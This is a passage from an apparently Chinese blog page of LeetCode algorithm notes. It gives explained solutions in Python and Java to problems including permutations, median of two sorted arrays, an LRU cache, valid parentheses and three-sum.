class="line">&#125;</span><br></pre></td></tr></table></div></figure>








        <h2 id="全排列"   >
          <a href="#全排列" class="heading-link"><i class="fas fa-link"></i></a><a href="#全排列" class="headerlink" title="全排列"></a>全排列</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202209211602552.png" alt="image-20220921160228336"></p>
<p>使用回溯算法解决</p>
<p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://leetcode.cn/problems/permutations/solution/hui-su-suan-fa-python-dai-ma-java-dai-ma-by-liweiw/" >回溯算法入门级详解 + 练习（持续更新） - 全排列 - 力扣（LeetCode）</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>参考图解为</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202209211604340.png" alt="image-20220921160419171"></p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">permute</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]:</span></span><br><span class="line">        res = []</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">back</span>(<span class="params">nums,tmp</span>):</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">not</span> nums):</span><br><span class="line">                res.append(tmp)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(nums)):</span><br><span class="line">                tmpNums = nums[:i] + nums[i+<span class="number">1</span>:]</span><br><span class="line">                tmpTmp = tmp + [nums[i]]</span><br><span class="line">                back(tmpNums,tmpTmp)</span><br><span class="line">        back(nums,[])</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></div></figure>

<p>即每次进入回溯时，进入下一轮的可遍历的数组都是上一轮的数组减去当前要进入<code>tmp</code>剩下的数组，在C上可以使用一个<code>int</code>数组<code>vis</code>来代替是否被遍历到了。</p>

        <h2 id="寻找两个有序数组的中位数"   >
          <a href="#寻找两个有序数组的中位数" class="heading-link"><i class="fas fa-link"></i></a><a href="#寻找两个有序数组的中位数" class="headerlink" title="寻找两个有序数组的中位数"></a>寻找两个有序数组的中位数</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202209211928342.png" alt="image-20220921192837199"></p>

        <h3 id="归并排序查找"   >
          <a href="#归并排序查找" class="heading-link"><i class="fas fa-link"></i></a><a href="#归并排序查找" class="headerlink" title="归并排序查找"></a>归并排序查找</h3>
      <p>直接归并然后返回中位数的时间复杂度为<code>O(m+n)</code></p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">findMedianSortedArrays</span>(<span class="params">self, nums1: <span class="type">List</span>[<span class="built_in">int</span>], nums2: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">float</span>:</span></span><br><span class="line">        result = []</span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        nums1Len = <span class="built_in">len</span>(nums1)</span><br><span class="line">        nums2Len = <span class="built_in">len</span>(nums2)</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">True</span>):</span><br><span class="line">            <span class="keyword">if</span>(nums1Len == <span class="number">0</span>):</span><br><span class="line">                result += nums2</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span>(nums2Len == <span class="number">0</span>):</span><br><span class="line">                result += nums1</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> (nums1[i] &lt; nums2[j]):</span><br><span class="line">                result.append(nums1[i])</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span>(i == nums1Len):</span><br><span class="line">                    result += nums2[j:]</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                result.append(nums2[j])</span><br><span class="line">                j += <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span>(j == nums2Len):</span><br><span class="line">                    result += nums1[i:]</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        resultLen = <span class="built_in">len</span>(result)</span><br><span class="line">        <span class="keyword">if</span>(resultLen%<span class="number">2</span> == <span class="number">0</span>):</span><br><span class="line">            <span class="keyword">return</span> (result[<span class="built_in">int</span>(resultLen/<span class="number">2</span>)-<span class="number">1</span>] + result[<span class="built_in">int</span>(resultLen/<span class="number">2</span>)])/<span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> result[<span class="built_in">int</span>(resultLen/<span class="number">2</span>)]</span><br></pre></td></tr></table></div></figure>


        <h3 id="二分查找"   >
          <a href="#二分查找" class="heading-link"><i class="fas fa-link"></i></a><a href="#二分查找" class="headerlink" title="二分查找"></a>二分查找</h3>
      <p>即寻找两个有序数组排序之后的第k个数，假定如下</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">k = (len(a) + len(b))/2			len(a) + len(b)为奇数   	k为中位数索引</span><br><span class="line">k = (len(a) + len(b))/2 + 1		len(a) + len(b)为偶数		k为中位数索引+0.5</span><br></pre></td></tr></table></div></figure>

<p>然后尝试比较<code>a[k/2-1]</code>和<code>b[k/2-1]</code></p>
<ul>
<li><p><code>a[k/2-1] &gt; b[k/2-1]</code>时，比<code>b[k/2-1]</code>小或等于的最多只有<code>(k/2-1)*2=k-2</code>个数，那么该数<code>b[k/2-1]</code>必定不可能是中位数，那么排除<code>b[0:k/2-1]</code></p>
</li>
<li><p><code>a[k/2-1] &lt; b[k/2-1]</code>时，同理，排除<code>a[0:k/2-1]</code></p>
</li>
<li><p><code>a[k/2-1] = b[k/2-1]</code>时，也同理，排除<code>a[0:k/2-1]</code>和<code>b[0:k-2/1]</code></p>
</li>
</ul>

        <h2 id="在排序数组中查找元素的第一个和最后一个位置"   >
          <a href="#在排序数组中查找元素的第一个和最后一个位置" class="heading-link"><i class="fas fa-link"></i></a><a href="#在排序数组中查找元素的第一个和最后一个位置" class="headerlink" title="在排序数组中查找元素的第一个和最后一个位置"></a>在排序数组中查找元素的第一个和最后一个位置</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221002103928281.png" alt="image-20221002103928281"></p>

        <h3 id="二分查找-1"   >
          <a href="#二分查找-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#二分查找-1" class="headerlink" title="二分查找"></a>二分查找</h3>
      <p>时间复杂度为O(logn)，那么就用二分查找</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">List</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">search</span>(<span class="params">self,nums,left,right,target</span>):</span></span><br><span class="line">        <span class="keyword">if</span>(left &gt; right):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        mid = (left + right)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span>(nums[mid] &lt; target):</span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">            idx = self.search(nums,left,right,target)</span><br><span class="line">        <span class="keyword">elif</span>(nums[mid] &gt; target):</span><br><span class="line">            right = mid - <span class="number">1</span></span><br><span class="line">            idx = self.search(nums,left,right,target)</span><br><span class="line">        <span class="keyword">elif</span>(nums[mid] == target):</span><br><span class="line">            <span class="keyword">return</span> mid</span><br><span class="line">        <span class="keyword">return</span> idx</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">searchRange</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>], target: <span class="built_in">int</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span></span><br><span class="line">        res = []</span><br><span class="line">        idx = self.search(nums,<span class="number">0</span>,<span class="built_in">len</span>(nums)-<span class="number">1</span>,target)</span><br><span class="line">        <span class="keyword">if</span>(idx == <span class="literal">None</span>):</span><br><span class="line">            res = [-<span class="number">1</span>,-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            left = idx - <span class="number">1</span></span><br><span class="line">            right = idx + <span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span>(left &gt;= <span class="number">0</span> <span class="keyword">and</span> nums[left] == target):</span><br><span class="line">                left -= <span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span>(right &lt; <span class="built_in">len</span>(nums) <span class="keyword">and</span> nums[right] == target):</span><br><span class="line">                right += <span class="number">1</span></span><br><span class="line">            res = [left+<span class="number">1</span>,right-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></div></figure>






        <h2 id="LRU缓存Least-Recently-Used"   >
          <a href="#LRU缓存Least-Recently-Used" class="heading-link"><i class="fas fa-link"></i></a><a href="#LRU缓存Least-Recently-Used" class="headerlink" title="LRU缓存Least Recently Used)"></a>LRU缓存Least Recently Used)</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221002153031254.png" alt="image-20221002153031254"></p>
<ul>
<li><p>使用哈希表<code>HashMap</code>来完成<code>key</code>的唯一性</p>
</li>
<li><p>使用双向链表来完成<code>put</code>和<code>get</code>的时间复杂度要求，以及头部为最近使用的，尾部为最不常使用的</p>
</li>
<li><p>要记得删除节点和更新节点的时候，都要更新hash表</p>
</li>
</ul>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LRUCache</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DLinkedNode</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">int</span> key;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">int</span> value;</span><br><span class="line">        <span class="keyword">private</span> DLinkedNode next;</span><br><span class="line">        <span class="keyword">private</span> DLinkedNode prev;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">DLinkedNode</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">DLinkedNode</span><span class="params">(<span class="keyword">int</span> _key, <span class="keyword">int</span> _value)</span></span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.key = _key;</span><br><span class="line">            <span class="keyword">this</span>.value = _value;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> size;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> capacity;</span><br><span class="line">    <span class="keyword">private</span> Map&lt;Integer,DLinkedNode&gt; cache;</span><br><span class="line">    <span class="keyword">private</span> DLinkedNode head;</span><br><span class="line">    <span class="keyword">private</span> DLinkedNode tail;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">LRUCache</span><span class="params">(<span class="keyword">int</span> capacity)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.size = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">this</span>.capacity = capacity;</span><br><span class="line">        <span class="keyword">this</span>.head = <span class="keyword">new</span> DLinkedNode();</span><br><span class="line">        <span class="keyword">this</span>.tail = <span class="keyword">new</span> DLinkedNode();</span><br><span class="line">        <span class="keyword">this</span>.head.next = <span class="keyword">this</span>.tail;</span><br><span class="line">        <span class="keyword">this</span>.tail.prev = <span class="keyword">this</span>.head;</span><br><span class="line">        <span class="keyword">this</span>.cache = <span class="keyword">new</span> HashMap&lt;Integer,DLinkedNode&gt;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">put</span><span class="params">(<span class="keyword">int</span> key,<span class="keyword">int</span> value)</span></span>&#123;</span><br><span class="line">        DLinkedNode node = <span class="keyword">this</span>.cache.get(key);</span><br><span class="line">        <span class="comment">//如果不存在key,则直接放入头部</span></span><br><span class="line">        <span class="keyword">if</span>(node == <span class="keyword">null</span>)&#123;</span><br><span class="line">            DLinkedNode newNode = <span class="keyword">new</span> DLinkedNode(key,value);</span><br><span class="line">            addToHead(newNode);</span><br><span class="line">            <span class="keyword">this</span>.cache.put(key,newNode);</span><br><span class="line">            size ++;</span><br><span class="line">            <span class="comment">//超出容量，删除末尾的节点,更新hash表</span></span><br><span class="line">            <span class="keyword">if</span>(size &gt; capacity)&#123;</span><br><span class="line">                DLinkedNode needRmNode = <span class="keyword">this</span>.tail.prev;</span><br><span class="line">                removeNode(needRmNode);</span><br><span class="line">                <span class="keyword">this</span>.cache.remove(needRmNode.key);</span><br><span class="line">                size --;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">//存在key的话,就修改value,更新hash表,并且放入头部</span></span><br><span class="line">            node.value = value;</span><br><span class="line">            <span class="comment">//this.cache.put(key,node);</span></span><br><span class="line">            moveToHead(node);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">get</span><span class="params">(<span class="keyword">int</span> key)</span></span>&#123;</span><br><span class="line">        DLinkedNode node = <span class="keyword">this</span>.cache.get(key);</span><br><span class="line">        <span class="comment">//不存在该结点</span></span><br><span class="line">        <span class="keyword">if</span>(node == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//需要放入移动到头部</span></span><br><span class="line">            moveToHead(node);</span><br><span class="line">            <span class="keyword">return</span> node.value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addToHead</span><span class="params">(DLinkedNode node)</span></span>&#123;</span><br><span class="line">        node.next = <span class="keyword">this</span>.head.next;</span><br><span class="line">        node.prev = <span class="keyword">this</span>.head;</span><br><span class="line">        <span class="keyword">this</span>.head.next.prev = node;</span><br><span class="line">        <span class="keyword">this</span>.head.next = node;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">removeNode</span><span class="params">(DLinkedNode node)</span></span>&#123;</span><br><span class="line">        node.prev.next = node.next;</span><br><span class="line">        node.next.prev = node.prev;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">moveToHead</span><span class="params">(DLinkedNode node)</span></span>&#123;</span><br><span class="line">        removeNode(node);</span><br><span class="line">        addToHead(node);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>




        <h2 id="有效括号"   >
          <a href="#有效括号" class="heading-link"><i class="fas fa-link"></i></a><a href="#有效括号" class="headerlink" title="有效括号"></a>有效括号</h2>
      <p>利用栈匹配即可</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isValid</span>(<span class="params">self, s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span></span><br><span class="line">        <span class="built_in">dict</span> = &#123;</span><br><span class="line">            <span class="string">&quot;(&quot;</span>:<span class="string">&quot;)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;[&quot;</span>:<span class="string">&quot;]&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&#123;&quot;</span>:<span class="string">&quot;&#125;&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        stack = []</span><br><span class="line">        <span class="keyword">for</span> <span class="built_in">chr</span> <span class="keyword">in</span> s:</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">chr</span> <span class="keyword">in</span> <span class="built_in">dict</span>):</span><br><span class="line">                stack.append(<span class="built_in">chr</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span>(<span class="built_in">len</span>(stack) &gt; <span class="number">0</span>):</span><br><span class="line">                    top = stack.pop()</span><br><span class="line">                    <span class="keyword">if</span>(<span class="built_in">dict</span>[top] == <span class="built_in">chr</span>):</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">len</span>(stack) == <span class="number">0</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></div></figure>




        <h2 id="买卖股票的最佳时机"   >
          <a href="#买卖股票的最佳时机" class="heading-link"><i class="fas fa-link"></i></a><a href="#买卖股票的最佳时机" class="headerlink" title="买卖股票的最佳时机"></a>买卖股票的最佳时机</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221005144848588.png" alt="image-20221005144848588"></p>
<p>一次遍历，找出当前阶段价格最小的一天然后进行计算利益替换最大利益</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">maxProfit</span>(<span class="params">self, prices: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span></span><br><span class="line">        maxProfit = <span class="number">0</span></span><br><span class="line">        minDay = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(prices)):</span><br><span class="line">            <span class="keyword">if</span>(prices[i] &lt; prices[minDay]):</span><br><span class="line">                minDay = i</span><br><span class="line">            <span class="keyword">elif</span>(prices[i] - prices[minDay] &gt; maxProfit):</span><br><span class="line">                maxProfit = prices[i] - prices[minDay]</span><br><span class="line">        <span class="keyword">return</span> maxProfit</span><br></pre></td></tr></table></div></figure>




        <h2 id="三数之和"   >
          <a href="#三数之和" class="heading-link"><i class="fas fa-link"></i></a><a href="#三数之和" class="headerlink" title="三数之和"></a>三数之和</h2>
      <p>快排加双指针</p>
<p>定位一个位置，然后一步步逼近</p>
<p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://leetcode.cn/problems/3sum/solution/3sumpai-xu-shuang-zhi-zhen-yi-dong-by-jyd/" >三数之和（排序+双指针，易懂图解） - 三数之和 - 力扣（LeetCode）</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221006151523738.png" alt="image-20221006151523738"></p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">threeSum</span>(<span class="params">self, nums: [<span class="built_in">int</span>]</span>) -&gt; [[<span class="built_in">int</span>]]:</span></span><br><span class="line">        self.quickStart(nums)</span><br><span class="line">        res = []</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(nums)-<span class="number">2</span>):</span><br><span class="line">            <span class="keyword">if</span>(nums[k] &gt; <span class="number">0</span>):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span>(k &gt; <span class="number">0</span> <span class="keyword">and</span> nums[k-<span class="number">1</span>]==nums[k]):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            j = <span class="built_in">len</span>(nums) - <span class="number">1</span></span><br><span class="line">            i = k + <span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span>(i &lt; j):</span><br><span class="line">                s = nums[k] + nums[i] + nums[j]</span><br><span class="line">                <span class="keyword">if</span>(s &lt; <span class="number">0</span>):</span><br><span class="line">                    i += <span class="number">1</span></span><br><span class="line">                    <span class="keyword">while</span>(i &lt; j <span class="keyword">and</span> nums[i] == nums[i-<span class="number">1</span>]):</span><br><span class="line">                        i += <span class="number">1</span></span><br><span class="line">                <span class="keyword">elif</span>(s &gt; <span class="number">0</span>):</span><br><span class="line">                    j -= <span class="number">1</span></span><br><span class="line">                    <span class="keyword">while</span>(i &lt; j <span class="keyword">and</span> nums[j] == nums[j+<span class="number">1</span>]):</span><br><span class="line">                        j -= <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    res.append([nums[k],nums[i],nums[j]])</span><br><span class="line">                    i += <span class="number">1</span></span><br><span class="line">                    j -= <span class="number">1</span></span><br><span class="line">                    <span class="keyword">while</span> i &lt; j <span class="keyword">and</span> nums[i] == nums[i - <span class="number">1</span>]: i += <span class="number">1</span></span><br><span class="line">                    <span class="keyword">while</span> i &lt; j <span class="keyword">and</span> nums[j] == nums[j + <span class="number">1</span>]: j -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">partition</span>(<span class="params">self,nums,low,high</span>):</span></span><br><span class="line">        pivot_idx = random.randint(low,high)</span><br><span class="line">        pivot = nums[pivot_idx]</span><br><span class="line">        nums[low],nums[pivot_idx] = nums[pivot_idx],nums[low]</span><br><span class="line">        left = low</span><br><span class="line">        right = high</span><br><span class="line">        <span class="keyword">while</span>(left &lt; right):</span><br><span class="line">            <span class="keyword">while</span>(left &lt; right <span class="keyword">and</span> pivot &lt;= nums[right]):</span><br><span class="line">                right -= <span class="number">1</span></span><br><span class="line">            nums[left] = nums[right]</span><br><span class="line">            <span class="keyword">while</span>(left &lt; right <span class="keyword">and</span> pivot &gt;= nums[left]):</span><br><span class="line">                left += <span class="number">1</span></span><br><span class="line">            nums[right] = nums[left]</span><br><span class="line">        nums[left] = pivot</span><br><span class="line">        <span class="keyword">return</span> left</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">quickSort</span>(<span class="params">self,nums,low,high</span>):</span></span><br><span class="line">        <span class="keyword">if</span>(low &gt;= high):</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        mid = self.partition(nums,low,high)</span><br><span class="line">        self.quickSort(nums,low,mid - <span class="number">1</span>)</span><br><span class="line">        self.quickSort(nums,mid + <span class="number">1</span> , high)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">quickStart</span>(<span class="params">self,nums</span>):</span></span><br><span class="line">        self.quickSort(nums,<span class="number">0</span>,<span class="built_in">len</span>(nums)-<span class="number">1</span>)</span><br></pre></td></tr></table></div></figure>




        <h2 id="不规则正方体表面积"   >
          <a href="#不规则正方体表面积" class="heading-link"><i class="fas fa-link"></i></a><a href="#不规则正方体表面积" class="headerlink" title="不规则正方体表面积"></a>不规则正方体表面积</h2>
